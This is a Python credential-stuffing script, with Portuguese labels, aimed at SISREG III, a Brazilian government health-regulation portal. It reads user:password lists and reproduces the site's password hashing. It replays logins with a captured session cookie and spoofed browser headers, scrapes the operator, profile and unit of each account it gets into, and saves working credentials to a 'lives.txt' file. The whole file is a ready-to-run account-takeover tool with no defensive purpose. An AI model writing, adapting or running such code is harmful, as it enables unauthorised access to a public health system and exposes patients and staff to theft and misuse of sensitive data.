import requests
import hashlib
import re
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor
import os

init(autoreset=True)

# CONFIG
ARQUIVO_CONTAS = "lista.txt"
URL_LOGIN = "https://sisregiii.saude.gov.br/"
THREADS = 3

def gerar_hash_site(senha_pura):
    senha_limpa = senha_pura.strip()
    return hashlib.sha256(senha_limpa.upper().encode('utf-8')).hexdigest()

def limpar_texto(texto):
    if not texto:
        return texto
    texto = texto.replace('&nbsp;', '').strip()
    texto = re.sub(r'\s+', ' ', texto)
    return texto.strip()

def extrair_dados_perfil(html):
    dados = {
        "operador": "NÃO ENCONTRADO",
        "perfil": "NÃO ENCONTRADO",
        "unidade": "NÃO ENCONTRADO"
    }
    
    padrao_operador = re.compile(r'<b>Operador:</b><font[^>]*>&nbsp;([^<]+)&nbsp;</font>', re.IGNORECASE)
    padrao_perfil = re.compile(r'<b>Perfil:</b><font[^>]*>&nbsp;([^<]+)&nbsp;</font>', re.IGNORECASE)
    padrao_unidade = re.compile(r'<b>Unidade:</b><font[^>]*>&nbsp;([^<]+)&nbsp;</font>', re.IGNORECASE)
    
    match = padrao_operador.search(html)
    if match:
        dados["operador"] = limpar_texto(match.group(1))
    
    match = padrao_perfil.search(html)
    if match:
        dados["perfil"] = limpar_texto(match.group(1))
    
    match = padrao_unidade.search(html)
    if match:
        dados["unidade"] = limpar_texto(match.group(1))
    
    # Fallbacks
    if dados["operador"] == "NÃO ENCONTRADO":
        match = re.search(r'Operador:</b><font[^>]*>([^<]+)</font>', html, re.IGNORECASE)
        if match:
            dados["operador"] = limpar_texto(match.group(1))
    
    if dados["perfil"] == "NÃO ENCONTRADO":
        match = re.search(r'Perfil:</b><font[^>]*>([^<]+)</font>', html, re.IGNORECASE)
        if match:
            dados["perfil"] = limpar_texto(match.group(1))
    
    if dados["unidade"] == "NÃO ENCONTRADO":
        match = re.search(r'Unidade:</b><font[^>]*>([^<]+)</font>', html, re.IGNORECASE)
        if match:
            dados["unidade"] = limpar_texto(match.group(1))
    
    # Remove versão do sistema da unidade
    if dados["unidade"] != "NÃO ENCONTRADO":
        dados["unidade"] = re.sub(r'\s*V\s*-\s*[\d.]+.*$', '', dados["unidade"]).strip()
    
    return dados

def testar_login(usuario, senha_hash):
    cookies = {
        'TS01cd1fda': '0140e3e4e598fa5b567163260fea13011a810718d0ae91bc8bd58017d51d5fac9546a345770c595f7792576b69bde566e549edcf993dd4c07d406e0d4ab3b92b3856012151638cc579cae2789c2b969e63425fea3f',
    }

    headers = {
        'Host': 'sisregiii.saude.gov.br',
        'Cache-Control': 'max-age=0',
        'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'Origin': 'https://sisregiii.saude.gov.br',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'https://sisregiii.saude.gov.br/',
        'Accept-Language': 'pt-BR,pt;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    payload = {
        'usuario': usuario,
        'senha': '',
        'senha_256': senha_hash,
        'etapa': 'ACESSO',
        'logout': '',
    }

    try:
        response = requests.post(URL_LOGIN, data=payload, headers=headers, cookies=cookies, timeout=20, allow_redirects=True)
        html = response.text

        # --- VERIFICA SE É PÁGINA DE AVISO (conta com senha errada) ---
        if "AVISO AOS OPERADORES DO SISREG" in html or "Leia com regularidade esses avisos" in html:
            return {
                "status": "❌ RECUSADO",
                "operador": "N/A",
                "perfil": "N/A",
                "unidade": "N/A",
                "mensagem": "Senha incorreta"
            }

        # --- LOGIN BEM-SUCEDIDO ---
        if "detalheUsuario" in html or "Sair" in html:
            dados = extrair_dados_perfil(html)
            
            if dados["operador"] != "NÃO ENCONTRADO" and dados["perfil"] != "NÃO ENCONTRADO":
                return {
                    "status": "✅ APROVADO",
                    "operador": dados["operador"],
                    "perfil": dados["perfil"],
                    "unidade": dados["unidade"],
                    "mensagem": "Login realizado com sucesso!"
                }
            else:
                return {
                    "status": "⚠️ PARCIAL",
                    "operador": dados["operador"],
                    "perfil": dados["perfil"],
                    "unidade": dados["unidade"],
                    "mensagem": "Login OK mas dados incompletos"
                }
        
        # --- SENHA INCORRETA ---
        elif "Login ou senha incorreto(s)" in html:
            return {
                "status": "❌ RECUSADO",
                "operador": "N/A",
                "perfil": "N/A",
                "unidade": "N/A",
                "mensagem": "Senha incorreta ou usuário inválido"
            }
        
        # --- CONTA BLOQUEADA / SUSPENSA ---
        elif "bloqueada" in html.lower() or "suspensa" in html.lower():
            return {
                "status": "🚫 BLOQUEADO",
                "operador": "N/A",
                "perfil": "N/A",
                "unidade": "N/A",
                "mensagem": "Conta bloqueada ou suspensa"
            }
        
        else:
            return {
                "status": "⚠️ DESCONHECIDO",
                "operador": "N/A",
                "perfil": "N/A",
                "unidade": "N/A",
                "mensagem": "Resposta inesperada - pode ser senha incorreta"
            }

    except requests.exceptions.Timeout:
        return {
            "status": "⏰ TIMEOUT",
            "operador": "N/A",
            "perfil": "N/A",
            "unidade": "N/A",
            "mensagem": "Servidor não respondeu"
        }
    except requests.exceptions.ConnectionError:
        return {
            "status": "🔌 ERRO CONEXÃO",
            "operador": "N/A",
            "perfil": "N/A",
            "unidade": "N/A",
            "mensagem": "Erro de conexão"
        }
    except Exception as e:
        return {
            "status": f"⚠️ ERRO",
            "operador": "N/A",
            "perfil": "N/A",
            "unidade": "N/A",
            "mensagem": str(e)[:50]
        }

def processar_conta(linha):
    linha = linha.strip()
    if not linha or ":" not in linha:
        return

    usuario, senha_original = linha.split(":", 1)
    hash_envio = gerar_hash_site(senha_original)
    resultado = testar_login(usuario, hash_envio)

    status = resultado["status"]
    
    if status == "✅ APROVADO":
        print(f"{Fore.GREEN}✅ {usuario}:{senha_original}")
        print(f"{Fore.CYAN}   👤 Operador: {resultado['operador']}")
        print(f"{Fore.YELLOW}   📋 Perfil: {resultado['perfil']}")
        print(f"{Fore.MAGENTA}   🏢 Unidade: {resultado['unidade']}")
        print(f"{Fore.WHITE}   {'─'*50}")
        
        os.makedirs("Resultados", exist_ok=True)
        with open("Resultados/lives.txt", "a", encoding="utf-8") as f:
            f.write(f"{usuario}:{senha_original} | Operador: {resultado['operador']} | Perfil: {resultado['perfil']} | Unidade: {resultado['unidade']}\n")
    
    elif status == "⚠️ PARCIAL":
        print(f"{Fore.YELLOW}⚠️ {usuario}:{senha_original}")
        print(f"{Fore.YELLOW}   📛 Motivo: {resultado['mensagem']}")
        if resultado['operador'] != "N/A":
            print(f"{Fore.YELLOW}   👤 Operador: {resultado['operador']}")
        if resultado['perfil'] != "N/A":
            print(f"{Fore.YELLOW}   📋 Perfil: {resultado['perfil']}")
        if resultado['unidade'] != "N/A":
            print(f"{Fore.YELLOW}   🏢 Unidade: {resultado['unidade']}")
        print(f"{Fore.WHITE}   {'─'*50}")
    
    elif status == "❌ RECUSADO":
        print(f"{Fore.RED}❌ {usuario}:{senha_original}")
        print(f"{Fore.RED}   📛 Motivo: {resultado['mensagem']}")
        print(f"{Fore.WHITE}   {'─'*50}")
        
        os.makedirs("Resultados", exist_ok=True)
        with open("Resultados/recusados.txt", "a", encoding="utf-8") as f:
            f.write(f"{usuario}:{senha_original} | Motivo: {resultado['mensagem']}\n")
    
    elif status == "🚫 BLOQUEADO":
        print(f"{Fore.YELLOW}🚫 {usuario}:{senha_original}")
        print(f"{Fore.YELLOW}   📛 Motivo: {resultado['mensagem']}")
        print(f"{Fore.WHITE}   {'─'*50}")
        
        os.makedirs("Resultados", exist_ok=True)
        with open("Resultados/bloqueados.txt", "a", encoding="utf-8") as f:
            f.write(f"{usuario}:{senha_original} | Motivo: {resultado['mensagem']}\n")
    
    else:
        print(f"{Fore.WHITE}⚠️ {usuario}:{senha_original}")
        print(f"{Fore.WHITE}   📛 Motivo: {resultado.get('mensagem', status)}")
        print(f"{Fore.WHITE}   {'─'*50}")

def iniciar():
    print(f"{Fore.CYAN}{'═'*60}")
    print(f"{Fore.CYAN}   SISTEMA DE VERIFICAÇÃO SISREG III")
    print(f"{Fore.CYAN}   Threads: {THREADS} | Arquivo: {ARQUIVO_CONTAS}")
    print(f"{Fore.CYAN}{'═'*60}\n")

    try:
        with open(ARQUIVO_CONTAS, "r", encoding="utf-8") as f:
            contas = f.readlines()
        
        contas = [c.strip() for c in contas if c.strip()]
        
        print(f"📊 Total de contas: {len(contas)}\n")
        
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            list(executor.map(processar_conta, contas))

    except FileNotFoundError:
        print(f"{Fore.RED}❌ Erro: Arquivo '{ARQUIVO_CONTAS}' não encontrado!")

    print(f"\n{Fore.CYAN}{'═'*60}")
    print(f"{Fore.GREEN}✅ Teste finalizado!")
    print(f"{Fore.YELLOW}📁 Resultados salvos em:")
    print(f"   - Resultados/lives.txt     (APROVADOS)")
    print(f"   - Resultados/recusados.txt (RECUSADOS)")
    print(f"   - Resultados/bloqueados.txt (BLOQUEADOS)")
    print(f"{Fore.CYAN}{'═'*60}")
    input("\nPressione ENTER para sair...")

if __name__ == "__main__":
    iniciar()